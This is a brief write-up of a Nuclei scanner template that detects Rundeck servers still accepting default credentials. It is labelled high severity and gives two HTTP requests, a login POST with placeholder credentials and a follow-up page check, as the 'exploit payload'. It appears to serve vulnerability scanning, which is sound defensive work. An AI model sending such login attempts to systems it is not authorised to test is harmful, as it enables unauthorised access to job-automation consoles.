# Nuclei Template: Rundeck - Default Login
**Template ID:** rundeck-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`rundeck-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Rundeck default login was discovered.

## Steps to reproduce / Exploit Payload
```http
POST /j_security_check HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

j_username={{username}}&j_password={{password}}

GET /menu/home HTTP/1.1
Host: {{Hostname}}
```

## References
- https://raw.githubusercontent.com/karkis3c/bugbounty/main/nuclei-templates/default-login/rundeck-default-login.yaml
- https://docs.rundeck.com/docs/learning/
